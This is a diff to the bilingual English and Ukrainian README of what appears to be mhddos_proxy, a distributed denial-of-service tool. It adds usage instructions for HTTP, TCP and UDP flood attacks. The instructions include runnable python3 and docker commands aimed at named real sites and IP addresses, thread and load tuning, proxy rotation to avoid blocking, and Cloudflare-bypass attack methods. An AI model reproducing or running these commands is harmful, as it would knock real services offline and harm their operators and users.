@@ -87,6 +87,14 @@ For UDP targets, attack method is UDP FLOOD.
 **VPN IS REQUIRED FOR UDP**, proxying is not supported.  
 Separate parameter `--udp-threads` controls the load, the default is 1, **INCREASE SLOWLY**, be careful
 
+Для цілей HTTP(S) метод атаки вибирається випадковим чином із параметра `--http-methods` (замовчування див. вище).
+
+Для цілей TCP методом атаки є TCP FLOOD
+
+Для цілей UDP методом атаки є UDP FLOOD.  
+**Для UDP ПОТРІБЕН VPN**, проксі не підтримується.  
+Окремий параметр `--udp-threads` задає навантаження, за замовчуванням - 1, **ЗБІЛЬШУВАТИ ПОВІЛЬНО**, будьте обережні
+
     python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
 
     docker run -it portholeascend/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
@@ -98,18 +106,22 @@ Target specification
 - TCP by IP:PORT - `tcp://194.54.14.131:4477`
 - UDP by IP:PORT - `udp://217.175.155.100:53` - **REQUIRES VPN**
 
-Increase load
+Increase load | Збільшити навантаження (підбирайте самостійно, замовчування - 100 на кожне ядро CPU)
 
     python3 runner.py -t 1000 https://tvzvezda.ru
 
-Update proxies less/more often
+View DEBUG info (traffic) | Переглянути інформацію про хід атаки
+
+    python3 runner.py https://tvzvezda.ru --debug
+
+Change proxy update interval | Змінити частоту оновлення проксі
 
     python3 runner.py -p 600 https://tvzvezda.ru
 
-Get more proxies (possibly lower quality)
+Get more proxies (possibly lower quality) | Більше проксі, але гіршої якості
 
     python3 runner.py --proxy-timeout 5 https://tvzvezda.ru
 
-Specific attack method(s) (two Cloudflare bypass methods in this case)
+Specific HTTP(S) attack method(s) | Обрати метод(и) для HTTP(S) атаки
 
     python3 runner.py https://tvzvezda.ru --http-methods CFB CFBUAM
